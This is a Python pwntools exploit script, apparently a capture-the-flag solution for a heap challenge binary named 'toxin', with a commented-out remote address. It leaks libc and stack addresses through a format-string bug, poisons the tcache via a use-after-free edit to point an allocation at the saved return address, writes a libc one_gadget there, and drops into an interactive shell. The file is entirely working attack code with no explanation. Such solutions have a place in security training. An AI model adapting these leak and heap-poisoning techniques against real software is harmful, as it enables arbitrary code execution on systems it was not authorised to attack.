#!/usr/bin/env python3

from pwn import *

exe = ELF("./toxin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

p = process()
#p = remote('94.237.62.166',40647)
gdb.attach(p,gdbscript='''
            b*add_toxin+232
            b*add_toxin+320
            b*edit_toxin+197
           b*drink_toxin+180
             b*search_toxin+213
          ''')
def add(size,idx,content):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'length: ',size)
    p.sendlineafter(b'index: ',idx)
    p.sendafter(b'formula: ',content)

def edit(idx,content):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'index: ',idx)
    p.sendafter(b'formula: ',content)

def free(idx):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'index: ',idx)
def search_fsb(fsb):
    p.sendlineafter(b'> ',b'4')
    p.sendafter(b'term: ',fsb)

    
########## leak libc ##########
search_fsb(b'%13$p')

leak = int(p.recvuntil(b' ')[:-1],16)

libc.address = leak - 0x21b97
log.info(f"libc: {hex(libc.address)}")

#########leak PIE ##########
#search_fsb(b'%9$p')
#leak_PIE = int(p.recvuntil(b' ')[:-1],16)

#exe.address = leak_PIE - 0x1284
#log.info(f"exe: {hex(exe.address)}")

##### leak Stack #######
search_fsb(b'%p')
leak_stack = int(p.recvuntil(b' ')[:-1],16)
log.info(f"leak_stack: {hex(leak_stack)}")
saved_RIP = leak_stack + 0xe
log.info(f"save RIP {hex(saved_RIP)}")


############# TCACHE POISON  ###################
input()
add(str(0x30),b'0','yoWTF')
free(b'0')
edit(b'0',p64(saved_RIP))
ONE_GADGET = 0x4f322
input()



p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'length: ',str(0x30))
p.sendlineafter(b'index: ',b'1')
p.sendafter(b'formula: ',b'nothing')


p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'length: ',str(0x30))
p.sendlineafter(b'index: ',b'2')
p.sendafter(b'formula: ',p64(libc.address + ONE_GADGET))

#input()
#search_fsb(b'%999$c')
#p.sendlineafter(b'> ',b'7')



p.interactive()
